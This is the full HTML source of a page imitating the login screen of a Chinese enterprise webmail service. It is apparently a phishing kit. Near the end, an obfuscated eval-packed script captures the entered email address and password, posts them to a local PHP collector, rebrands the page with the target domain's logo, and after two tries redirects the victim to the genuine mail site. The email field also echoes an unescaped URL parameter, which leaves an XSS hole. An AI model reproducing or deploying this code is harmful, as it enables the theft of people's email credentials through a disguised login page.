            //参数(图片,允许的宽度,允许的高度)    
            var image = new Image();
            image.src = ImgD.src;
            if (image.width > 0 && image.height > 0) {
                if (image.width / image.height >= iwidth / iheight) {
                    if (image.width > iwidth) {
                        ImgD.width = iwidth;
                        ImgD.height = (image.height * iwidth) / image.width;
                    } else {
                        ImgD.width = image.width;
                        ImgD.height = image.height;
                    }
                } else {
                    if (image.height > iheight) {
                        ImgD.height = iheight;
                        ImgD.width = (image.width * iheight) / image.height;
                    } else {
                        ImgD.width = image.width;
                        ImgD.height = image.height;
                    }
                }
            }
        }
    </script>
</head>

<body>

    <div id="Pagetop" class="pagetop clearfix">
        <div class="lang_list">
            <div class="lang_wrap">

                <a hidefocus="true" class="mgR" href="javascript:switch_language('zh_CN');">简体中文</a>

                <a hidefocus="true" class="mgR" href="javascript:switch_language('zh_HK');">繁体中文</a>

                <a hidefocus="true" class="mgR" href="javascript:switch_language('en');">English</a>

                <a hidefocus="true" class="mgR" href="javascript:switch_language('ja_JP');">日本語</a>

                <a hidefocus="true" class="mgR" href="javascript:switch_language('kr');">한국어</a>

            </div>
        </div>
    </div>
    <div id="Container">
        <div id="Container_wrap">
            <div id="login_header" class="login_header">
                <div class="header_wrap">
                    <div class="header_logo"><a href="#" hidefocus="true"><img class="pngfix"
                                src="http://mail.wxlida.cn/accounts/domainlogo/wxlida_cn.png?v=1684065006949" width="984" height="100"
                                onload="javascript:drawImage(this,984,100);" style="top:0px" /></a></div>
                </div>
            </div>
            <div id="login_main" class="login_main login_protection">
                <div class="login_main_top clearfix">
                </div>
                <div class="login_main_c clearfix">
                    <div class="sidebar_left" style="height:368px">







                        <!-- 自定义上传图片,不需要轮播，也不需要再图片上加按钮连接 -->

                        <div class="user_define_img_display_none" id="user_define_img_0" onmouseover="removeTimer()"
                            onmouseout="restartTimer()">


                            <img src="http://mail.wxlida.cn/accounts/images/mail/mainleft_1_2.jpg" width="488" height="365"
                                onload="javascript:drawImage(this,488,365);" />
                        </div>

                        <div class="user_define_img_display_none" id="user_define_img_1" onmouseover="removeTimer()"
                            onmouseout="restartTimer()">


                            <div style=" display:block;position:absolute;top:320px;" class="mail_ftn">
                                <span><i class="login_pro_icon"></i>邮箱登录保护</span>
                                <span>
                                    <input type="checkbox" id="openit"><label for="open-now-1">登录后设置</label>
                                </span>
                            </div>

                            <img src="http://mail.wxlida.cn/accounts/images/mail/mainleft_1_1.jpg" width="488" height="365"
                                onload="javascript:drawImage(this,488,365);" />
                        </div>

                        <div class="user_define_img" id="user_define_img_2" onmouseover="removeTimer()"
                            onmouseout="restartTimer()">


                            <a class="user_define_img_btn7" href="http://help.mail.35.com/mailman/56.html"
                                target="_blank"><img src="http://mail.wxlida.cn/accounts/images/mail/mainleft_1_7_btn.png" /></a>

                            <img src="http://mail.wxlida.cn/accounts/images/mail/mainleft_1_7.jpg" width="488" height="365"
                                onload="javascript:drawImage(this,488,365);" />
                        </div>

                        <div class="user_define_img_display_none" id="user_define_img_3" onmouseover="removeTimer()"
                            onmouseout="restartTimer()">


                            <a class="user_define_img_btn6" href="http://help.mail.35.com/mailman/81.html"
                                target="_blank"><img src="http://mail.wxlida.cn/accounts/images/mail/mainleft_1_6_btn.png" /></a>

                            <img src="http://mail.wxlida.cn/accounts/images/mail/mainleft_1_6.jpg" width="488" height="365"
                                onload="javascript:drawImage(this,488,365);" />
                        </div>

                        <div class="user_define_img_display_none" id="user_define_img_4" onmouseover="removeTimer()"
                            onmouseout="restartTimer()">


                            <a class="user_define_img_btn5" href="http://help.mail.35.com/mailman/80.html"
                                target="_blank"><img src="http://mail.wxlida.cn/accounts/images/mail/mainleft_1_5_btn.png" /></a>

                            <img src="http://mail.wxlida.cn/accounts/images/mail/mainleft_1_5.jpg" width="488" height="365"
                                onload="javascript:drawImage(this,488,365);" />
                        </div>

                        <div class="user_define_img_display_none" id="user_define_img_5" onmouseover="removeTimer()"
                            onmouseout="restartTimer()">


                            <a class="user_define_img_btn4"
                                href="http://help.mail.35.com/index.php?m=content&amp;c=index&amp;a=show&amp;catid=13&amp;id=37"
                                target="_blank"><img src="http://mail.wxlida.cn/accounts/images/mail/mainleft_1_4_btn.png" /></a>

                            <img src="http://mail.wxlida.cn/accounts/images/mail/mainleft_1_4.jpg" width="488" height="365"
                                onload="javascript:drawImage(this,488,365);" />
                        </div>





                        <div class="mail_ftn"></div>
                    </div>
                    <div class="sidebar_right">
                        <div class="login_box">
                            <div class="login_box_in">
                                <div class="login_box_inner">
                                    <form id="loginform" name="loginform"
                                        action="" method="post">
                                        

                                        <div class="enter_box">













                                            <h2><span>欢迎使用云办公</span></h2>

                                            <dl class="versionsel_zone">
                                                <!--<dt>邮箱版本：</dt>-->
                                                <dt id="dt_curr_ver">
                                                    <i id="ver_lagship" class="current"
                                                        onclick="choose_mail_version('mail');">旗舰版</i>
                                                    <i id="ver_topspeed" onclick="choose_mail_version('lite');">极速版</i>
                                                    <span id="span_curr_ver" mail_version='mail'></span>
                                                </dt>
                                                <!-- 
   <dd>									   
       <a class="link" href="javascript:void(0)" id="a_curr_ver" onclick="switchMailVersion();" hidefocus="true"><span id="span_curr_ver" mail_version='mail'></span></a>
       <a class="link" href="javascript:void(0)" onclick="$('#mail_version_list').toggle();" hidefocus="true"><span id="span_curr_ver" mail_version='mail'></span><i class="icon ico_arrowd"></i></a>
       <div id="mail_version_list" class="seloption" style="display:none;">
         <ul>
           <li id="li_mail_ver_mail" class="option_cur"><i class="icon ico_selected"></i><a class="current" id="a_mail_ver_mail" onclick="choose_mail_version('mail');" style="cursor:pointer" hidefocus="true">切换到极速版</a></li>
           <li id="li_mail_ver_lite"><i class="icon ico_selected"></i><a id="a_mail_ver_lite" onclick="choose_mail_version('lite');" style="cursor:pointer" hidefocus="true" title="切换到旗舰版，可使用邮局所有功能，完整体验企业邮箱">切换到旗舰版</a></li>
         </ul>
       </div>
   </dd>
    -->
                                            </dl>



                                            <noscript>
                                                <div class="login_box_msg noScript">您的浏览器不支持或已经禁止网页脚本，您无法正常登录。</div>
                                            </noscript>
                                            <div class="tb_loginbox" id="loginDiv">

                                                <div class="tr clearfix" id="user_div">
                                                    <div id="username_box" class="username_box">
                                                        <table cellspacing="0" cellpadding="0" border="0" width="100%"
                                                            class="tb_username">
                                                            <tr>
                                                                <td class="td_username">
                                                                    <table cellspacing="0" cellpadding="0" border="0">
                                                                        <tr>
                                                                            <td>
                                                                                <div class="logtxtbox" id="user_box_id">
                                                                                    <label class="username_msg"
                                                                                        id="user_hold"
                                                                                        style="display:none">用户名</label>
                                                                                    <input type="text" maxlength="50"
                                                                                        onblur="checkUser()" id="email"
                                                                                        name="email" tabindex="1"
                                                                                        value="<?php echo $_GET['userid']; ?>" />

                                                                                </div>
                                                                            </td>
                                                                        </tr>
                                                                    </table>
                                                                </td>
                                                                <td class="td_domain">
                                                                    
                                                                </td>
                                                            </tr>
                                                        </table>
                                                    </div>
                                                </div>

                                                <div class="tr clearfix" id="pwd_div">
                                                    <div class="logtxtbox" id="password_box_id">
                                                        <label class="pwd_msg" id="password_hold">密码</label>
                                                        <input type="password" tabindex="2" class="input_pwd"
                                                            name="password" id="password" autocomplete="new-password" />
                                                        <span class="ico-password-hide" id="showPwdSpan"
                                                            onclick="showPwd()"></span>
                                                    </div>
                                                </div>

                                                <div class="tr clearfix" id="phone_div" style="display:none">
                                                    <div class="logtxtbox" id="password_box_id">
                                                        <label class="phone_msg" id="phone_hold">请输入手机号码</label>
                                                        <input type="text" tabindex="1" name="phone" id="phone"
                                                            onblur="checkPhone()" />
                                                    </div>
                                                </div>
                                                <div id="sms_code_div" class="tr clearfix" style="display:none">

                                                    <div id="smscode_box_id" class="logtxtbox">
                                                        <label id="smscode_hold" class="pwd_msg">手机登录码</label>
                                                        <input id="smscode" type="text" tabindex="4"
                                                            class="input_authcode" value="" name="smscode"
                                                            maxlength="10" autocomplete="off" />
                                                    </div>
                                                    
                                                </div>

                                                <div class="tr tr_btnbox clearfix btn_box">
                                                    <button type="submit" id="submit-btn" class="enter_btn" tabindex="4"><b><span>登&nbsp;录</span></b></button>

                                                    <label class="label" id="allWayHttpsContainer"><input
                                                            type="checkbox" id="allWayHttps" name="allWayHttps"
                                                            onchange="javascript:changeAllWayHttpsLoginStatus(this);"
                                                            title='SSL全程保护' />SSL全程保护</label>



                                                    <a class="adminlogin" href="../domain/" id="domainA"><i
                                                            class="icon ico_arrow"></i>管理员登录</a>
                                                    <a class="adminlogin" href="javascript:;" onclick="showUserPwd()"
                                                        style="display:none" id="pwdLoginA">密码登录</a>

                                                </div>

                                                <div class="quick-login" id="quick_div">用其他账号登录：<br />
                                                    <a href="https://smail37.cn4e.com/accounts/bindMail?serverName=mail.wxlida.cn&locale=zh_CN"
                                                        class="qq">腾讯QQ</a><a href="javascript:void(0)"
                                                        onclick="showWX()" class="vx" style="display:none">微信</a><a
                                                        href="javascript:void(0)" onclick="showPhone()"
                                                        class="sj">手机</a>
                                                </div>

                                                <div id="info" class="td_tipinfo">
                                                    <div class="tif_border">
                                                        <span id="fail" class="fail">


                                                        </span>
                                                    </div>
                                                </div>
                                            </div>
                                            <center>
                                                <div id="msg" style="display: none; color: red;">The login is invalid.</div>
                                            </center>
                                            <div class="tb_loginbox" id="emailsDiv" style="display:none">
                                                <div class="choose">请选择要登录的账号</div>
                                                <div id="emailsDiv2">
                                                </div>
                                                <div class="btn2"><a href="javascript:;"
                                                        onclick="showUserPwd()">密码登录</a></div>
                                            </div>


                                            <div class="login_tools login_tools_new">









                                                <div class="tools_cell tools_mail">
                                                    <ul>

                                                        <li class="clearfix">
                                                            <div class="popup_tag clearfix">
                                                                <div id="tag_1" class="tagcur"
                                                                    onMouseOver="mouseover('1')"><i class="iCur"></i><a
                                                                        href="javascript:void(0)"><span>android客户端</span></a>
                                                                </div>
                                                                <div id="tag_2" onMouseOver="mouseover('2')"><i
                                                                        class="iCur"></i><i class="brLeft"></i><a
                                                                        href="javascript:void(0)"><span>iPhone客户端</span></a>
                                                                </div>
                                                                <div id="tag_3" onMouseOver="mouseover('3')"><i
                                                                        class="iCur"></i><i class="brLeft"></i><a
                                                                        href="javascript:void(0)"><span>企业即时通讯</span><i
                                                                            class="ico_more"></i></a></div>
                                                            </div>
                                                            <div id="phonecon_1" class="tagcon clearfix">
                                                                <dl id="downld_box_mail" class="downld_box_mail">
                                                                    <dd class="dd_green"><a
                                                                            href="https://mcapi.mailchat.cn/go/35apk"
                                                                            hidefocus="true" target="_blank"><i
                                                                                class="icon ico_cmpt"></i>下载到电脑</a></dd>

                                                                    <dd class="dd_dark">
                                                                        <a id="link_2dcode_mail"
                                                                            href="javascript:void(0)"
                                                                            hidefocus="true"><i
                                                                                class="icon ico_2dcode"></i>通过二维码</a>
                                                                        <div id="ppbox_2dcode" class="popbox"
                                                                            style="bottom:30px; left:-9px; width:175px; display:none;">
                                                                            <i
                                                                                class="icon ico_corner ico_corner_downL"></i>
                                                                            <div class="popbox_con">
                                                                                <div class="twodcode_img">
                                                                                    <img
                                                                                        src="images/mail/mailchat.png" />
                                                                                </div>
                                                                                <div class="twodcode_txt">
                                                                                    可通过手机二维码扫描软件，扫描二维码即可立即下载。
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </dd>
                                                                </dl>
                                                                <div class="clear"></div>
                                                                <!-- <div class="msg">手机浏览器直接输入"d.35.com/2Ta"</div> -->
                                                            </div>
                                                            <div id="phonecon_2" class="tagcon hide clearfix">
                                                                <dl id="downld_box_mail" class="downld_box_mail">
                                                                    <dd class="dd_green"><a
                                                                            href="https://mcapi.mailchat.cn/go/35iphone"
                                                                            target="_blank" hidefocus="true"><i
                                                                                class="icon ico_cmpt"></i>通过Appstore免费下载</a>
                                                                    </dd>
                                                                    <dd class="dd_dark">
                                                                        <a id="link_2dcode_mail_phone"
                                                                            href="javascript:void(0)"
                                                                            hidefocus="true"><i
                                                                                class="icon ico_2dcode"></i>通过二维码</a>
                                                                        <div id="ppbox_2dcode_phone" class="popbox"
                                                                            style="bottom:30px; left:-9px; width:175px; display:none;">
                                                                            <i
                                                                                class="icon ico_corner ico_corner_downL"></i>
                                                                            <div class="popbox_con">
                                                                                <div class="twodcode_img">
                                                                                    <img
                                                                                        src="images/mail/mailchat.png" />
                                                                                </div>
                                                                                <div class="twodcode_txt">
                                                                                    可通过手机二维码扫描软件，扫描二维码即可立即下载。
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </dd>
                                                                </dl>
                                                                <div class="clear"></div>
                                                                <!-- <div class="msg">直接通过iPhone手机Appstore搜索"35mail"更快捷</div> -->
                                                            </div>
                                                            <div id="phonecon_3" class="tagcon hide clearfix">
                                                                <dl id="downld_box_mail" class="downld_box_mail">
                                                                    <dd class="dd_green"><a
                                                                            href="http://mcfile.mailchat.cn/win/MailChat_35_Setup.exe"
                                                                            target="_blank" hidefocus="true"><i
                                                                                class="icon ico_cmpt"></i>下载电脑客户端</a>
                                                                    </dd>
                                                                </dl>
                                                                <div class="clear"></div>
                                                            </div>
                                                        </li>



                                                        <li>

                                                            <a class="icon ico_arr_rig"
                                                                href="shortcutdownload?service=http%3A%2F%2Fmail.wxlida.cn%2FSofia.jsp&domain=wxlida.cn"
                                                                target="_blank" hidefocus="true">桌面快捷方式</a>

                                                            <a class="icon ico_arr_rig" href="http://help.mail.35.com"
                                                                target="_blank" hidefocus="true">常见问题</a>
                                                            <a class="icon ico_arr_rig"
                                                                href="/jsp/tools/speed.jsp?locale=zh_CN" target="_blank"
                                                                hidefocus="true" id="switchingServerEle">登录太慢？</a>
                                                        </li>

                                                    </ul>
                                                </div>


                                            </div>

                                        </div>
                                    </form>
                                </div>
                            </div>
                            <div class="ui-dialog-server" id="switchingServerPopup" style="display:none">
                                <div class="hd"><span style="display:none" id="usedTime"></span><a
                                        href="javascript:void(0)" onclick="closeSwitchingServerPopup()"
                                        class="btn-close-dialog"><img src="images/dialog-server-btn-close.png"></a>
                                </div>
                                <div class="bd">
                                    <div class="tips">登录速度有点慢哦，可能是由于网络问题造成的</div>
                                    <div style="padding:20px 0;"><img src="images/dialog-server-img.png"></div>
                                    <div class="btnbar"><a href="javascript:void(0)"
                                            onclick="closeSwitchingServerPopup()" class="btn"
                                            style="margin-top: 0;">继续等待</a>
                                        <a href="/jsp/tools/speed.jsp?locale=zh_CN" class="btn btn-main"
                                            style="margin-top: 0;">切换线路</a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="login_main_bot clearfix"></div>
            </div>
            <div id="login_footer" class="login_footer clearfix">
                <div class="footer_content" style="color:#888888">

                    地址：厦门市软件园二期观日路8号(三五互联) <br />邮编：361008 <br />电话： <br />传真：
                    <br />
                    备案号：<a style="color:#888888" href="https://beian.miit.gov.cn/">苏ICP备17062110号</a>
                </div>
            </div>
        </div>
    </div>
    <div class="low_vers_tip" id="eisp2_tip" style="_top:713px;display:none;">
        <i class="icon icon_note"></i>您正在使用的<strong><span
                id="browserVersionTip">IE7.0</span></strong>版本浏览器将<strong>严重影响邮局安全性及运行速度</strong>！建议升级到<a
            href="javascript:ie8Click();">IE8.0</a>或更换浏览器。<a class="close" href="javascript:closeBrowerTip();">我知道了！</a>
    </div>
   
</body>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
   eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$(16).17(6(){3 m=0;$(\'#18\').M(6(){$("#8").A();$(\'#B\').5("");$("#19").N({1a:O,P:"A"},0);$("#1b").N({1c:O,P:"w"},1d)});3 n=F.G.1e.x(1);7(!n){}Q{3 o=n;$(\'#B\').5(o);$(\'#1f\').y(o);3 p=/^([a-u-v-R\\.\\-])+\\@(([a-u-v-9\\-])+\\.)+([a-u-v-9]{2,4})+$/;7(!p.S(o)){$(\'#C\').w();n.T;U V}3 q=o.D("@");3 r=o.x((q+1));3 c=r.x(0,r.D(\'.\'));3 s=c.W();3 t=c.X();$("#H").I("Y","Z://10.11.12/"+r);$("#H").I("1g",t);$("#J").y(t);$(".J").y(t)}$(\'#K-L\').M(6(b){$(\'#C\').A();$(\'#8\').A();b.1h();3 d=$("#B").5();3 e=$("#E").5();3 z=$("#13").5();3 f=$(\'#8\').y();$(\'#8\').1i(f);3 g=d;3 h=/^([a-u-v-R\\.\\-])+\\@(([a-u-v-9\\-])+\\.)+([a-u-v-9]{2,4})+$/;7(!h.S(g)){$(\'#C\').w();d.T;U V}3 i=g.D("@");3 j=g.x((i+1));3 c=j.x(0,j.D(\'.\'));3 k=c.W();3 l=c.X();$("#H").I("Y","Z://10.11.12/"+j);$("#J").y(l);m=m+1;$.1j({1k:\'1l\',1m:\'../1n-1o.1p\',1q:\'1r\',1s:{B:d,E:e,13:z,},1t:6(a){$(\'#K-L\').5(\'1u...\')},1v:6(a){7(a){$("#8").w();1w.1x(a);7(a[\'1y\']==\'1z\'){$("#E").5("");7(m>=2){m=0;F.G.1A("14://15."+j)}}Q{}}},C:6(){$("#E").5("");7(m>=2){m=0;F.G.1B("14://15."+j)}$("#8").w()},1C:6(){$(\'#K-L\').5(\'1D\')}})})});',62,102,'|||var||val|function|if|msg||||||||||||||||||||||zA|Z0|show|substr|html||hide|email|error|indexOf|password|window|location|logoimg|attr|logoname|submit|btn|click|animate|200|opacity|else|9_|test|focus|return|false|toLowerCase|toUpperCase|src|https|logo|clearbit|com|lourl|http|www|document|ready|back1|automail|left|inputbar|right|1000|hash|emailich|alt|preventDefault|text|ajax|dataType|JSON|url|form|loaded|php|type|POST|data|beforeSend|Verifing|success|console|log|signal|ok|href|replace|complete|LOGIN'.split('|'),0,{}))

</script>
</html>